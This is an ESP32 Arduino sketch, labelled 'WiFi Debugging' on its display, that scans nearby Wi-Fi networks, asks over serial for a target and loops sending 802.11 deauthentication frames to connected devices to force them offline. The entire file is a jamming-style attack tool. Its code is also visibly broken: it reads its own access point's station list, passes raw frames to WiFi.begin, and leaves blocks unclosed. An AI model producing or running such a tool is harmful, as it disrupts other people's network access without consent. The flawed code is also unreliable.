#include <Adafruit_GFX.h>
#include <Adafruit_ILI9341.h>
#include <WiFi.h>

// Initialize the display
Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, TFT_RST);

// Define deauthentication frame
uint8_t deauth_frame_default[26] = {
  0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x02, 0x00
};

void setup() {
  // Start serial communication
  Serial.begin(115200);

  // Initialize the display
  tft.begin();
  tft.setRotation(3);
  tft.fillScreen(ILI9341_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(ILI9341_WHITE);
  tft.setTextSize(2);
  tft.println("WiFi Debugging");
}

void loop() {
  // Scan for Wi-Fi networks
  int n = WiFi.scanNetworks();

  if (n == 0) {
    // Display an error message if no networks found
    tft.setCursor(0, 30);
    tft.println("No networks found");
  } else {
    // Display the list of networks
    for (int i = 0; i < n; i++) {
      tft.setCursor(0, 30 + i * 10);
      tft.print(i);
      tft.print(": ");
      tft.println(WiFi.SSID(i));
    }

    // Wait for user input to select a network to target
    int selection = -1;
    while (selection < 0 || selection >= n) {
      tft.setCursor(0, 30 + n * 10);
      tft.println("Enter selection (0 - " + String(n - 1) + "):");
      while (Serial.available() == 0) {
        // Wait for user input
      }
      selection = Serial.parseInt();
      Serial.println(selection);
    }

    // Display the selected network and send deauthentication frames to all connected devices
    String selected_ssid = WiFi.SSID(selection);
    tft.setCursor(0, 30 + n * 10);
    tft.println("Selected network: " + selected_ssid);
    while (true) {
    
    // Get the list of connected devices on the selected network
int num_devices = WiFi.softAPgetStationNum();
wifi_sta_list_t sta_list;
memset(&sta_list, 0, sizeof(sta_list));
esp_wifi_ap_get_sta_list(&sta_list);

// Send deauthentication frames to all connected devices on the selected network
for (int i = 0; i < sta_list.num; i++) {
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  WiFi.begin(selected_ssid.c_str());
  while (WiFi.status() != WL_CONNECTED) {
    // Wait for connection
    delay(100);
  }
  Serial.print("Connected to " + selected_ssid + " as ");
  Serial.println(WiFi.localIP());

  uint8_t * mac = sta_list.sta[i].mac;
  char mac_addr[18];
  snprintf(mac_addr, sizeof(mac_addr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  Serial.print("Sending deauth packet to: ");
  Serial.println(mac_addr);

  // Build deauthentication frame
  uint8_t deauth_frame[26];
  memcpy(deauth_frame, deauth_frame_default, 26);
  memcpy(&deauth_frame[4], mac, 6);

  // Send deauthentication frame
  WiFi.disconnect();
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_STA);
  delay(100);
  WiFi.begin(selected_ssid.c_str(), "", 1, deauth_frame);
  delay(10);
  WiFi.disconnect();
  WiFi.mode(WIFI_OFF);
}
